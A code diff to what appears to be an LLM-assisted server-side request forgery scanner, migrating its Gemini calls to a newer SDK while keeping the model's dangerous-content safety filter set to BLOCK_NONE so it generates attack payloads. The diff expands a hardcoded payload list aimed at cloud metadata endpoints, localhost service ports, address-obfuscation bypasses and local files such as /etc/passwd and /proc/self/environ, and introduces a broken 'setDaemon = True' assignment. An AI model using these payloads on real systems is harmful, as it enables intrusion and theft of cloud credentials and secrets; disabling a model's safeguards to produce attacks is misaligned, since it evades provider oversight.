@@ -13,11 +13,12 @@ import urllib
 import json
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 import os
-import google.generativeai as genai
-from google.generativeai.types import HarmCategory, HarmBlockThreshold
+from google import genai
+from google.genai import types
 import ollama
 import openai
 import anthropic
+import time
 
 banner="""
  ### #### ####        ### #   # ###   #### # # 
@@ -62,8 +63,7 @@ if args.provider:
 
     try:
         if "google" in args.provider:
-            genai.configure(api_key=API_KEY)
-            llm_client = genai.GenerativeModel(args.model)
+            llm_client = genai.Client(api_key=API_KEY)
         elif "openai" in args.provider:
             llm_client = openai.OpenAI(api_key=API_KEY)
         elif "anthropic" in args.provider:
@@ -94,12 +94,17 @@ def send_to_llm(system_instructions, user_content):
     for attempt in range(max_retries):
         try:
             if "google" in args.provider:
-                # Synchronous call
-                response = llm_client.generate_content(
-                    [complete_prompt],
-                    safety_settings={
-                        HarmCategory.HARM_CATEGORY_DANGEROUS_CONTENT: HarmBlockThreshold.BLOCK_NONE,
-                    }
+                response = llm_client.models.generate_content(
+                    model=args.model,
+                    contents=[complete_prompt],
+                    config=types.GenerateContentConfig(
+                        safety_settings=[
+                            types.SafetySetting(
+                                category="HARM_CATEGORY_DANGEROUS_CONTENT",
+                                threshold="BLOCK_NONE"
+                            )
+                        ]
+                    )
                 )
                 return response.text
 
@@ -147,6 +152,7 @@ def pause_for_confirmation(url, reason):
     and waits for input to continue.
     """
     with print_lock:
+
 	    try:
 		    input(f"\033[93mPress [ENTER] to continue hunting other parameters...\033[0m")
 	    except KeyboardInterrupt:
@@ -261,17 +267,30 @@ def smart_pivot_to_internal(paramName, original_url, initial_response_text):
     """
     Orchestrator: Generates payloads -> Executes -> Validates.
     """
-    if not args.provider:
-        return
 	
     # 1. GENERATE
-    custom_payloads = generate_payloads_with_llm(initial_response_text)
+    custom_payloads = ""
+    if args.provider and args.model:
+        custom_payloads = generate_payloads_with_llm(initial_response_text)
+    
     if not custom_payloads:
-        print("[AI] LLM failed to generate payloads. Falling back to hardcoded list.")
+        print("[AI] LLM not provided OR failed to generate payloads. Falling back to hardcoded list.")
         custom_payloads = [
-            "http://127.0.0.1:80", 
-            "file:///etc/passwd", 
-            "http://169.254.169.254/latest/meta-data/"
+            "http://127.0.0.1:80","http://metadata.google.internal/computeMetadata/v1/",
+"http://169.254.169.254/latest/meta-data/",
+"http://127.0.0.1",
+"http://127.0.0.1:8080",
+"http://127.0.0.1:8000",
+"http://127.0.0.1:9200",
+"http://127.0.0.1:6379",
+"http://127.0.0.1:22",
+"http://2130706433",
+"http://localtest.me",
+"http://[::1]",
+"file:///etc/passwd",
+"file:///etc/hosts",
+"file:///proc/self/environ",
+"file:///C:/Windows/win.ini"
         ]
     else:
         print(f"\033[92m[AI] Generated {len(custom_payloads)} context-aware payloads.\033[0m")
@@ -742,13 +761,13 @@ if args.burp:
 	print ("\nProcessing Burp file\n")
 	for i in range(num_threads):
 		worker = Thread(target=burp_siteMap_parse, args=(q_burp,))
-		worker.setDaemon(True)
+		worker.setDaemon = True
 		worker.start()
 q_burp.join()
 print ("\nStarting Crawling\n")
 for i in range(num_threads):
 	worker = Thread(target=do_stuff, args=(q,))
-	worker.setDaemon(True)
+	worker.setDaemon = True
 	worker.start()
 
 q.join()
